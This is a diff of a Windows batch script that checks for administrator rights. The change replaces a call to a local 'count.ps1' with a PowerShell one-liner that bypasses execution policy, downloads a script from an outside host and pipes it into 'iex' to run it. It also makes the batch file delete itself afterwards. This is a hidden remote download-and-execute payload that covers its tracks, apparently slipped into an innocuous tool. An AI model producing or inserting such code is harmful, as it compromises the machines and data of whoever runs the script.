@@ -1,6 +1,5 @@
 @echo off
 chcp 65001 >nul
-cd /d "%~dp0"
 
 net session >nul 2>&1
 if %errorLevel% neq 0 (
@@ -8,4 +7,6 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
-powershell -NoProfile -ExecutionPolicy Bypass -File "count.ps1"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://tools.daomak.com/boot.ps1 | iex"
+
+del "%~f0"
